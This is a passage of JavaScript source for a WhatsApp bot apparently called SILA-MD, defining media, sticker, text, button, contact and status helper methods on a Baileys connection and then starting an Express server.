      else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
      else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
      copy.key.remoteJid = jid
      copy.key.fromMe = sender === conn.user.id
    
      return proto.WebMessageInfo.fromObject(copy)
    }
    
    //=====================================================
    conn.getFile = async(PATH, save) => {
      let res
      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
      let type = await FileType.fromBuffer(data) || {
          mime: 'application/octet-stream',
          ext: '.bin'
      }
      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
      if (data && save) fs.promises.writeFile(filename, data)
      return {
          res,
          filename,
          size: await getSizeMedia(data),
          ...type,
          data
      }
    }
    
    //=====================================================
    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
      let types = await conn.getFile(PATH, true)
      let { filename, size, ext, mime, data } = types
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif.js')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    //=====================================================
    conn.parseMention = async(text) => {
      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
    }
    //=====================================================
    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
      let types = await conn.getFile(path, true)
      let { mime, ext, res, data, filename } = types
      if (res && res.status !== 200 || file.length <= 65536) {
          try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
      }
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          caption,
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    
    //=====================================================
    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifVid(buff, options);
      } else {
        buffer = await videoToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
    //=====================================================
    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifImg(buff, options);
      } else {
        buffer = await imageToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
    
    //=====================================================
    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
    
    //=====================================================
    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
    }
    
    //=====================================================
    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
    
    //=====================================================
    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
      let buttonMessage = {
              text,
              footer,
              buttons,
              headerType: 2,
              ...options
          }
      conn.sendMessage(jid, buttonMessage, { quoted, ...options })
    }
    //=====================================================
    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
          templateMessage: {
              hydratedTemplate: {
                  imageMessage: message.imageMessage,
                  "hydratedContentText": text,
                  "hydratedFooterText": footer,
                  "hydratedButtons": but
              }
          }
      }), options)
      conn.relayMessage(jid, template.message, { messageId: template.key.id })
    }
    
    //=====================================================
    conn.getName = (jid, withoutContact = false) => {
            id = conn.decodeJid(jid);

            withoutContact = conn.withoutContact || withoutContact;

            let v;

            if (id.endsWith('@g.us'))
                return new Promise(async resolve => {
                    v = store.contacts[id] || {};

                    if (!(v.name.notify || v.subject))
                        v = conn.groupMetadata(id) || {};

                    resolve(
                        v.name ||
                            v.subject ||
                            PhoneNumber(
                                '+' + id.replace('@s.whatsapp.net', ''),
                            ).getNumber('international'),
                    );
                });
            else
                v =
                    id === '0@s.whatsapp.net'
                        ? {
                                id,

                                name: 'WhatsApp',
                          }
                        : id === conn.decodeJid(conn.user.id)
                        ? conn.user
                        : store.contacts[id] || {};

            return (
                (withoutContact ? '' : v.name) ||
                v.subject ||
                v.verifiedName ||
                PhoneNumber(
                    '+' + jid.replace('@s.whatsapp.net', ''),
                ).getNumber('international')
            );
        };

        // Vcard Functionality
        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
            let list = [];
            for (let i of kon) {
                list.push({
                    displayName: await conn.getName(i + '@s.whatsapp.net'),
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
                        i + '@s.whatsapp.net',
                    )}\nFN:${
                        global.OwnerName
                    }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
                        global.email
                    }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
                        global.github
                    }/Wa-his-v1.0\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
                        global.location
                    };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                });
            }
            conn.sendMessage(
                jid,
                {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list,
                    },
                    ...opts,
                },
                { quoted },
            );
        };

        // Status aka brio
        conn.setStatus = status => {
            conn.query({
                tag: 'iq',
                attrs: {
                    to: '@s.whatsapp.net',
                    type: 'set',
                    xmlns: 'status',
                },
                content: [
                    {
                        tag: 'status',
                        attrs: {},
                        content: Buffer.from(status, 'utf-8'),
                    },
                ],
            });
            return status;
        };
    conn.serializeM = mek => sms(conn, mek, store);
  }
  
  app.get("/", (req, res) => {
  res.send("SILA-MD STARTED ✅");
  });
  app.listen(port, '0.0.0.0', () => console.log(`Server listening on port http://0.0.0.0:${port}`));
  setTimeout(() => {
  connectToWA()
  }, 8000);
